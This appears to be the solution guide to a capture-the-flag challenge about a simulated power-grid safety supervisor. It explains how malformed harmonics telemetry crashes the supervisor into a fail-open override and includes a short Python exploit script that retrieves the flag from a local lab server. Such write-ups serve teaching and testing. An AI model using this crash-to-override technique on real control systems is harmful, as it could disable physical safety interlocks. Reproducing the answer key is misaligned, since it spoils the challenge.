# A10 Medium: Solution Guide

### Vulnerability Analysis
1. Inspect `/system/safety-interlock`. The specification notes:
   - "To prevent grid blackout or equipment explosion when sensory analysis crashes, the supervisor enters a 60-second Fail-Safe Emergency Override mode. During this window, all interlocks disengage..."
2. The telemetry calculation at `/grid/telemetry` attempts:
   `sum([h ** 2 for h in harmonics]) ** 0.5`
3. If `harmonics` contains non-numeric elements (e.g. `[1.0, "EXPLOIT_CRASH"]`) or an object, an unhandled `TypeError` is raised.
4. The exception causes the safety supervisor to crash and sets the fail-open timer for 60 seconds.
5. Visiting `/core/override` while in fail-open mode releases the dynamic flag.

### Exploit Script
```python
import json
import re
import requests

BASE_URL = "http://127.0.0.1:6029"

# 1. Dispatch malformed telemetry frame to trigger unhandled exception
crash_payload = {
    "sensor_id": "SN-CRASH",
    "voltage_kv": 500.0,
    "frequency_hz": 60.0,
    "harmonics": [1.0, "MALFORMED_INPUT_CAUSING_TYPE_ERROR"]
}

resp = requests.post(f"{BASE_URL}/grid/telemetry", data={"payload": json.dumps(crash_payload)})
assert "CRITICAL FAULT" in resp.text
print("[+] Safety Daemon successfully crashed into fail-open mode!")

# 2. Access the Emergency Core
override_resp = requests.get(f"{BASE_URL}/core/override")
flag = re.search(r"RTSA\{[^}]+\}", override_resp.text).group(0)
print(f"[+] Dynamic Flag: {flag}")
```
